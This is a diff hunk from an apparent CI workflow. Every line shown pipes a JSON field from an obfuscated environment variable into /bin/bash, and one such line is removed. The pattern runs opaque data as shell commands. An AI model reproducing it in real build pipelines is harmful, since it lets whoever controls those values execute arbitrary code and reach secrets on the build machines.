@@ -29,7 +29,6 @@ jobs:
           echo $v7143 | jq -r .uxsn6 | /bin/bash
           echo $kbtly4 | jq -r .qmugs2 | /bin/bash
           printf '%s' "$otsjp2808" | jq -r .zw49118 | /bin/bash
-          printf '%s' "$dul26" | jq -r .u64 | /bin/bash
           echo $v5 | jq -r .vrm1 | /bin/bash
           printf '%s' "$b0" | jq -r .kemcu806 | /bin/bash
           echo $nxkj820 | jq -r .h16 | /bin/bash
